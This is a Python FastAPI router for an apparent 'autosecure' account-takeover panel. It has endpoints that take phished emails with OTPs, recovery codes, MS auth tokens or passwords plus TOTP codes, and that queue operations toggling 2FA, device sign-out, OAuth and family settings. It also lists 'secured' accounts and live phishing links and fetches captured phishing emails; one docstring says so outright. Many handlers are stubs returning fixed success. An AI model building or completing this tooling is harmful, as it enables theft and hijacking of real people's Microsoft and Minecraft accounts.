from fastapi import APIRouter, HTTPException, Depends, Body
from app import get_db, verify_token
from typing import Optional
import uuid, time

router = APIRouter()

# === Secure Operations ===

@router.get("/api/secure/status")
async def get_status(uid: str, user: str = Depends(verify_token)):
    conn = get_db()
    session = conn.execute("SELECT * FROM romeo_sessions WHERE id = ?", (uid,)).fetchone()
    conn.close()
    if not session:
        raise HTTPException(404, {"error": "not_found", "message": "Session not found"})
    return {"success": True, "status": dict(session)["stage"] or "pending", "uid": uid, "http_status": 200}

@router.post("/api/secure/otp")
async def secure_otp(
    email: str = Body(...), 
    otp: str = Body(...),
    domain: Optional[str] = Body(None),
    tfa: bool = Body(True),
    sign_out: bool = Body(True),
    devices: bool = Body(True),
    oauths: bool = Body(True),
    family: bool = Body(True),
    bot_id: Optional[int] = Body(None),
    user: str = Depends(verify_token)
):
    uid = str(uuid.uuid4())
    conn = get_db()
    conn.execute(
        "INSERT INTO romeo_sessions (id, user_id, bot_index, email, stage) VALUES (?, ?, ?, ?, 'queued')",
        (uid, user, bot_id, email)
    )
    conn.commit(); conn.close()
    return {
        "success": True, "uid": uid, "message": "Secure operation queued", 
        "status": "queued", "http_status": 202, "method": "OTP"
    }

@router.post("/api/secure/recovery")
async def secure_recovery(email: str = Body(...), recovery_code: str = Body(...), user: str = Depends(verify_token)):
    uid = str(uuid.uuid4())
    conn = get_db()
    conn.execute("INSERT INTO romeo_sessions (id, user_id, email, stage) VALUES (?, ?, ?, 'queued')", (uid, user, email))
    conn.commit(); conn.close()
    return {"success": True, "uid": uid, "message": "Secure operation queued", "status": "queued", "http_status": 202, "method": "RecoveryCode"}

@router.post("/api/secure/msauth")
async def secure_msauth(msauth: str = Body(..., embed=True), user: str = Depends(verify_token)):
    uid = str(uuid.uuid4())
    return {"success": True, "uid": uid, "message": "Secure operation queued", "status": "queued", "http_status": 202, "method": "MSAAuth"}

@router.post("/api/secure/pass2fa")
async def secure_pass2fa(
    email: str = Body(...), 
    password: str = Body(...), 
    totp: str = Body(...),
    domain: Optional[str] = Body(None),
    user: str = Depends(verify_token)
):
    uid = str(uuid.uuid4())
    return {"success": True, "uid": uid, "message": "Secure operation queued", "status": "queued", "http_status": 202, "method": "Password+2FA"}

# === OTP / MSAuth Pre-flight ===

@router.post("/api/autosecure/otp/send")
async def send_otp(
    email: str = Body(...), 
    proof_id: str = Body(...),
    proof_type: Optional[str] = Body("email"),
    last4: Optional[str] = Body(None),
    user: str = Depends(verify_token)
):
    return {"success": True, "message": "Code sent", "http_status": 200}

@router.post("/api/autosecure/otp/verify")
async def verify_otp(email: str = Body(...), otp: str = Body(...), user: str = Depends(verify_token)):
    return {"success": True, "verified": True, "http_status": 200}

@router.post("/api/autosecure/otp/request")
async def request_otp(body: dict = Body(...), user: str = Depends(verify_token)):
    email = body.get("email")
    if not email:
        raise HTTPException(400, {"error": "invalid_request", "message": "Email required"})
    return {
        "success": True, 
        "auth_app": False, 
        "proofs": [
            {"id": email.split('@')[0][:1]+"***@"+email.split('@')[1], "display": email, "type": "email"}
        ],
        "http_status": 200
    }

@router.post("/api/autosecure/msauth/request")
async def msauth_request(body: dict = Body(...), user: str = Depends(verify_token)):
    return {"success": True, "session_id": str(uuid.uuid4()), "entropy": "42", "http_status": 200}

@router.post("/api/autosecure/msauth/verify")
async def msauth_verify(body: dict = Body(...), user: str = Depends(verify_token)):
    return {"success": True, "msaauth": "EwAIA...", "http_status": 200}

@router.post("/api/autosecure/recovery")
async def verify_recovery(email: str = Body(...), code: str = Body(...), user: str = Depends(verify_token)):
    return {"success": True, "verified": True, "http_status": 200}

@router.get("/api/autosecure/config")
async def get_autosecure_config(user: str = Depends(verify_token)):
    return {
        "success": True, 
        "config": {
            "minValue": 50, 
            "domainFilter": "yourdomain.com",
            "servers": {"hypixel": "set", "default": "random"},
            "passwordGeneration": {
                "type": "two_words",
                "digits": 4,
                "prefix": "."
            }
        },
        "http_status": 200
    }

@router.put("/api/autosecure/config")
async def save_autosecure_config(config: dict = Body(...), user: str = Depends(verify_token)):
    return {"success": True, "message": "Config saved", "http_status": 200}

# === Autosecure Engine (WebSocket-compatible RPC-style) ===

@router.get("/api/autosecure/accounts")
async def get_secured_accounts(
    tags: Optional[str] = None, 
    exclude_tags: Optional[str] = None,
    limit: int = 20,
    user: str = Depends(verify_token)
):
    """Get secured accounts with filters: tags, exclude_tags (comma-separated)."""
    conn = get_db()
    rows = conn.execute("SELECT * FROM romeo_users LIMIT ?", (limit,)).fetchall()
    conn.close()
    return {"success": True, "accounts": [dict(r) for r in rows], "http_status": 200}

@router.get("/api/autosecure/links/live")
async def get_live_links(user: str = Depends(verify_token)):
    conn = get_db()
    rows = conn.execute("SELECT * FROM romeo_links WHERE expires_at > ?", (int(time.time()),)).fetchall()
    conn.close()
    return {"success": True, "links": [dict(r) for r in rows], "http_status": 200}

@router.post("/api/autosecure/mail")
async def fetch_emails(email: str = Body(..., embed=True), user: str = Depends(verify_token)):
    """Fetch captured emails from phishing for a given address."""
    return {"success": True, "email": email, "messages": [], "http_status": 200}

@router.post("/api/autosecure/lunar")
async def get_lunar_cosmetics(accessToken: str = Body(..., embed=True), user: str = Depends(verify_token)):
    """Get Lunar Client cosmetics for an account."""
    return {
        "success": True, 
        "cosmetics": {"allcosmetics": ["Dragon Wings", "Phoenix Cape"], "cosmeticamount": 2}, 
        "emotes": {"emotesamount": 10},
        "http_status": 200
    }
